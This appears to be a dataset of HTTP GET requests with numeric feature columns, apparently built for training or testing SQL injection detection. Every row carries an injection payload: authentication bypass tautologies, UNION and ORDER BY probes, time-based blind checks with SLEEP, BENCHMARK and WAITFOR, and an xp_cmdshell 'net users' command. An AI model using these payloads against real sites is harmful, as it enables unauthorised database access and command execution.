44,1,200,1422,7,14,8,1,1,GET ?account=' or 1=1 limit 1 -- -  HTTP/1.1
44,1,200,7685,7,14,8,1,1,GET ?account=' or 1=1 limit 1 -- -  HTTP/1.1
109,2,200,6183,46,10,20,1,1,GET ?code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6&code=") or ("1"="1 HTTP/1.1
52,2,200,5903,7,20,11,1,1,GET ?account=" or 1=1--&pass=admin' or 1=1# HTTP/1.1
125,2,200,3645,48,16,23,1,1,GET ?name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7#&tel=benchmark(50000000_MD5(1))# HTTP/1.1
108,1,200,4244,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
108,1,200,3430,30,4,15,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
37,2,200,5345,7,8,8,1,1,GET ?id=or 1=1#&id=" or ""^" HTTP/1.1
32,1,200,3277,7,8,10,1,1,GET ?code=') or ('x'='x HTTP/1.1
154,1,200,4369,46,5,15,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
119,2,200,5481,46,15,18,1,1,GET ?id=or pg_SLEEP(5)&id= RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
98,1,200,2578,53,4,17,1,1,GET ?mail= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL--  HTTP/1.1
28,1,200,6082,7,8,6,1,1,GET ?code= like '%' HTTP/1.1
133,1,200,3972,66,5,24,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118))) HTTP/1.1
94,2,200,3199,31,14,16,2,1,GET ?phone=admin" or 1=1/*&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6# HTTP/1.1
216,1,200,5050,145,7,17,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
216,1,200,1093,145,7,17,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
41,2,200,5751,14,9,6,1,1,GET ?name="*"&phone= ORDER BY 5  HTTP/1.1
25,2,200,2449,7,7,6,1,1,GET ?account='&' HTTP/1.1
25,2,200,3269,7,7,6,1,1,GET ?account='&' HTTP/1.1
156,2,200,4981,54,9,21,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19#&pass= UNION SELECT @@VERSION_SLEEP(5)_"'3'"# HTTP/1.1
35,1,200,6523,14,5,5,1,1,GET ?email= ORDER BY 22--  HTTP/1.1
98,2,200,4976,38,6,17,1,1,GET ?id= ORDER BY 3-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8--  HTTP/1.1
217,2,200,7505,85,12,30,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
62,2,200,5881,21,14,9,1,1,GET ?name= UNION ALL SELECT 1_2-- &tel=admin" or 1=1# HTTP/1.1
51,1,200,7095,21,7,3,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
211,2,200,6632,77,8,32,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24-- &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88) CHAR(88))) HTTP/1.1
62,2,200,6976,22,12,13,1,1,GET ?code=' or 'x'='x&code=-1 UNION SELECT 1 INTO @_@ HTTP/1.1
57,2,200,4093,14,13,10,1,1,GET ?account=" or "1"="1"--&pass= ORDER BY 19--  HTTP/1.1
39,1,200,4775,7,12,11,1,1,GET ?phone=admin') or '1'='1'# HTTP/1.1
39,1,200,4939,7,12,11,1,1,GET ?phone=admin') or '1'='1'# HTTP/1.1
39,1,200,3479,7,12,11,1,1,GET ?phone=admin') or '1'='1'# HTTP/1.1
69,2,200,6892,14,25,12,1,1,GET ?id=' group by username having 1=1--&id=1' ORDER BY 3--  HTTP/1.1
83,2,200,3210,42,4,19,1,1,GET ?id= ORDER BY 1_SLEEP(5)&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2--  HTTP/1.1
235,2,200,3235,54,11,24,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
29,1,200,1556,7,10,6,1,1,GET ?phone=sleep(5)# HTTP/1.1
29,1,200,4118,7,10,6,1,1,GET ?phone=sleep(5)# HTTP/1.1
76,2,200,4321,16,22,13,1,1,GET ?account=1 or benchmark(10000000_MD5(1))#&pass=1' ORDER BY 3--  HTTP/1.1
34,1,200,6658,7,11,7,1,1,GET ?pass=1) or sleep(5)# HTTP/1.1
139,2,200,4843,46,4,19,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22&id=== HTTP/1.1
40,1,200,4353,7,11,13,1,1,GET ?pass=admin') or ('1'='1'-- HTTP/1.1
40,1,200,3249,7,11,13,1,1,GET ?pass=admin') or ('1'='1'-- HTTP/1.1
40,1,200,4168,7,11,13,1,1,GET ?pass=admin') or ('1'='1'-- HTTP/1.1
164,2,200,1752,46,13,20,1,1,GET ?phone=") or true--&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
36,1,200,2521,14,5,6,1,1,GET ?email=1' ORDER BY 1--  HTTP/1.1
36,1,200,1839,14,5,6,1,1,GET ?email=1' ORDER BY 1--  HTTP/1.1
156,2,200,5430,30,17,19,1,1,GET ?mail=" or pg_sleep(5)--&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29 HTTP/1.1
129,2,200,2973,34,28,16,1,1,GET ?id=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055&pass= AND 7300=7300 AND ('pKlZ'='pKlZ HTTP/1.1
32,1,200,3222,7,12,5,1,1,GET ?username=' or a=a– HTTP/1.1
67,2,200,1212,9,20,13,1,1,GET ?phone=1) or benchmark(10000000_MD5(1))#&id=' or 1=1 – HTTP/1.1
48,2,200,5586,17,7,7,1,1,GET ?phone= ORDER BY 31337#&id= AND 1=1 HTTP/1.1
22,1,200,7196,7,4,6,1,1,GET ?user='*' HTTP/1.1
44,2,200,4858,9,11,13,1,1,GET ?name= OR 1=1&tel=') or ('a'='a HTTP/1.1
65,2,200,5876,9,21,16,1,1,GET ?code=') or ('a'='a and hi") or ("a"="a&code= OR 1=1 HTTP/1.1
90,2,200,5580,21,9,8,2,1,GET ?name= or 1=1/*&tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
118,2,200,2129,30,16,24,1,1,GET ?name=')) or pg_sleep(5)--&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
122,1,200,4361,46,5,16,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17# HTTP/1.1
74,2,200,2742,24,19,13,1,1,GET ?username=' or sleep(5)#&pass= AS INJECTX WHERE 1=1 AND 1=0-- HTTP/1.1
30,1,200,5792,12,4,7,1,1,GET ?id=pg_SLEEP(5)-- HTTP/1.1
30,1,200,2925,12,4,7,1,1,GET ?id=pg_SLEEP(5)-- HTTP/1.1
97,1,200,1755,21,5,5,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
62,2,200,4112,21,11,11,1,1,GET ?id=admin' or 1=1--&id= UNION ALL SELECT 1_2_3--  HTTP/1.1
188,1,200,2121,125,4,17,1,1,GET ?pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
33,1,200,4930,14,4,4,1,1,GET ?pass= ORDER BY 21#  HTTP/1.1
87,1,200,4951,24,20,4,2,1,GET login/?id=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
60,1,200,7534,30,4,13,1,1,GET ?user= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3 HTTP/1.1
99,1,200,7978,31,8,12,1,1,GET ?password= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
47,1,200,7304,7,17,13,1,1,GET ?email='));waitfor delay '0:0:5'-- HTTP/1.1
47,1,200,1316,7,17,13,1,1,GET ?email='));waitfor delay '0:0:5'-- HTTP/1.1
82,2,200,2699,15,38,12,1,1,GET ?email= WHERE 1=1 AND 1=0#&phone=exec master..xp_cmdshell 'net users' HTTP/1.1
102,1,200,1324,30,4,15,1,1,GET ?pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
59,2,200,4662,9,17,12,1,1,GET ?id= or 0=0 #&pass=benchmark(10000000_MD5(1))# HTTP/1.1
221,1,200,2209,102,4,44,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106)))--  HTTP/1.1
148,2,200,7920,60,6,20,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14#&pass= UNION ALL SELECT 1_2_3_4_5_6--  HTTP/1.1
134,2,200,5568,31,16,20,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19&id=')) or pg_sleep(5)-- HTTP/1.1
28,1,200,1591,7,6,8,1,1,GET ?pass=' or ''^' HTTP/1.1
82,1,200,2896,39,15,16,1,1,GET ?username=AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe HTTP/1.1
155,2,200,4071,53,9,28,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5#&phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
52,2,200,5396,7,17,11,1,1,GET ?id=admin") or ("1"="1"#&pass=' or a=a– HTTP/1.1
39,1,200,1145,14,7,6,2,1,GET login/?id=1' ORDER BY 1--  HTTP/1.1
48,2,200,3877,7,19,9,1,1,GET ?email=admin" or 1=1&phone=or 1=1-- HTTP/1.1
84,2,200,7467,39,7,18,1,1,GET ?tel=' AND MID(VERSION()_1_1) = '5';&name= UNION ALL SELECT SLEEP(5)--  HTTP/1.1
43,3,200,7788,7,10,17,1,1,GET ?mail=') or ('1'='1--&pass='&' HTTP/1.1
68,2,200,6915,9,31,15,1,1,GET ?tel= OR x=x&name=_(select * from (select(sleep(10)))a) HTTP/1.1
56,2,200,3647,13,17,8,1,1,GET ?code= HAVING 1=1&code=admin"or 1=1 or ""=" HTTP/1.1
28,1,200,4861,7,6,8,1,1,GET ?code=' or ''*' HTTP/1.1
28,1,200,5967,7,6,8,1,1,GET ?code=' or ''*' HTTP/1.1
135,1,200,5176,66,4,26,1,1,GET ?pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))--  HTTP/1.1
111,2,200,7306,31,12,18,1,1,GET ?email=' or ''^'&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
37,1,200,5635,7,11,10,1,1,GET ?user=admin') or ('1'='1 HTTP/1.1
95,1,200,3885,31,4,12,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
95,1,200,4857,31,4,12,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14# HTTP/1.1
30,1,200,4845,7,9,7,1,1,GET ?id=pg_sleep(5)-- HTTP/1.1
30,1,200,4731,7,9,7,1,1,GET ?id=pg_sleep(5)-- HTTP/1.1
160,2,200,7767,21,44,7,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28&phone=select session_user from sysibm.sysdummy1; HTTP/1.1
36,1,200,7393,14,8,3,1,1,GET ?username= ORDER BY 30  HTTP/1.1
60,1,200,4011,29,10,12,1,1,GET ?account=(SELECT * FROM (SELECT(SLEEP(5)))ecMj) HTTP/1.1
125,2,200,1668,30,7,18,1,1,GET ?name='^'&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
56,2,200,6611,15,13,10,1,1,GET ?account=' or 0=0 #&pass= WHERE 1=1 AND 1=0 HTTP/1.1
66,1,200,6274,37,5,11,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)--  HTTP/1.1
66,1,200,4012,37,5,11,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)--  HTTP/1.1
66,1,200,1424,37,5,11,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)--  HTTP/1.1
237,2,200,1355,131,7,20,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15#&name= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
34,1,200,1274,14,7,3,1,1,GET ?account= ORDER BY 1  HTTP/1.1
47,2,200,6105,7,16,13,1,1,GET ?id=admin' or '1'='1&id=' and a='a HTTP/1.1
184,2,200,7006,78,18,37,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75)))&phone=' or 'one'='one– HTTP/1.1
60,2,200,7002,7,24,15,2,1,GET ?email=admin' or 1=1&phone=admin') or '1'='1'/* HTTP/1.1
110,1,200,7957,30,8,14,1,1,GET ?password= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
154,1,200,6566,46,5,15,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
210,2,200,5858,61,16,27,3,1,GET ?code=SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/&code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29 HTTP/1.1
120,2,200,6364,32,32,22,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6&id= and (select substring(@@version_1_1))='M' HTTP/1.1
113,1,200,4342,31,8,13,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
81,2,200,7867,17,23,15,1,1,GET ?username= AND 7300=7300 AND ('pKlZ'='pKlZ&pass=admin") or ("1"="1"# HTTP/1.1
112,2,200,3216,31,20,23,1,1,GET ?mail=");waitfor delay '0:0:5'--&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8--  HTTP/1.1
313,2,200,2206,163,10,20,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
221,2,200,4966,76,9,26,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))--  HTTP/1.1
150,2,200,5796,53,12,19,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18#&pass= ORDER BY 31337# HTTP/1.1
41,1,200,2492,12,9,7,2,1,GET login/?id=' or 1=1 LIMIT 1;# HTTP/1.1
134,2,200,5017,60,12,18,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88)))--  HTTP/1.1
89,1,200,3935,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
88,2,200,5610,21,9,8,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16&name=or 1=1-- HTTP/1.1
185,2,200,7210,44,11,19,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11--  HTTP/1.1
33,1,200,5611,14,4,5,1,1,GET ?mail= ORDER BY 4--  HTTP/1.1
37,1,200,6937,7,15,5,1,1,GET ?username=admin" or 1=1# HTTP/1.1
48,2,200,4022,7,17,11,1,1,GET ?account=' or ''-'&pass=" or "x"="x HTTP/1.1
58,2,200,1391,17,9,9,2,1,GET ?name=' or 0=0 –&tel=RANDOMBLOB(1000000000/2) HTTP/1.1
179,2,200,7586,97,17,21,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &phone=admin" or "1"="1"# HTTP/1.1
36,2,200,4480,7,9,11,1,1,GET ?name=' or ''='&tel="^" HTTP/1.1
122,1,200,4413,31,8,11,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
73,1,200,4741,21,4,4,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15# HTTP/1.1
65,1,200,6273,30,2,15,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5--  HTTP/1.1
88,2,200,1679,25,33,12,1,1,GET ?tel=' UNION SELECT sum(columnname ) from tablename --&name= ORDER BY 17--  HTTP/1.1
33,1,200,6682,14,5,4,1,1,GET ?phone= ORDER BY 3#  HTTP/1.1
140,2,200,3990,30,9,21,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26&name=') or '1'='1 HTTP/1.1
322,2,200,2937,133,6,60,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17-- &pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113))) HTTP/1.1
117,2,200,6985,30,14,25,1,1,GET ?username=') or '1'='1--&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
62,1,200,7428,30,4,13,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4 HTTP/1.1
90,1,200,7878,21,4,5,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
63,2,200,6920,14,19,13,1,1,GET ?username= ORDER BY 31337#&pass=admin') or ('1'='1 HTTP/1.1
57,1,200,7431,7,27,12,1,1,GET ?phone=_(select * from (select(sleep(10)))a) HTTP/1.1
56,2,200,7857,14,17,9,2,1,GET ?email=admin' or 1=1/*&phone= ORDER BY 10#  HTTP/1.1
67,2,200,1634,30,7,18,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2&name= '-' HTTP/1.1
37,1,200,5667,7,12,5,1,1,GET ?phone=admin") or "1"="1 HTTP/1.1
35,1,200,1852,14,4,6,1,1,GET ?mail=1' ORDER BY 2--  HTTP/1.1
54,2,200,3407,19,11,9,2,1,GET ?email=or 1=1/*&pass= ORDER BY 1_SLEEP(5) HTTP/1.1
78,2,200,7715,7,37,17,2,1,GET ?id=admin' or 1=1/*&id= and (select substring(@@version_2_1))='i' HTTP/1.1
30,1,200,7887,7,6,7,1,1,GET ?pass=' or '1′='1 HTTP/1.1
61,1,200,3257,34,5,12,1,1,GET ?pass=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) HTTP/1.1
85,1,200,7550,31,7,13,1,1,GET ?account= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9--  HTTP/1.1
20,1,200,7652,7,4,4,1,1,GET ?user== HTTP/1.1
128,2,200,5908,53,8,18,1,1,GET ?mail= ORDER BY 16 &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13# HTTP/1.1
154,2,200,6137,46,17,19,1,1,GET ?username=admin" --&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
128,1,200,5666,31,8,11,1,1,GET ?password= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
46,1,200,5677,19,4,7,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_3_4--  HTTP/1.1
28,1,200,7553,7,6,5,1,1,GET ?pass= or 0=0 # HTTP/1.1
130,1,200,1591,46,7,15,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
130,1,200,3260,46,7,15,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
218,2,200,1088,94,11,45,1,1,GET ?id=" or sleep(5)="&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))--  HTTP/1.1
178,2,200,6836,44,8,17,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17#&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
104,1,200,2671,31,7,13,2,1,GET login/?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15--  HTTP/1.1
226,2,200,3221,141,13,22,1,1,GET ?email=' and 1='1&phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
144,2,200,4251,21,29,8,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28-- &pass=select session_user; HTTP/1.1
115,2,200,1451,30,9,17,1,1,GET ?tel=" or 1=1 –&name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18# HTTP/1.1
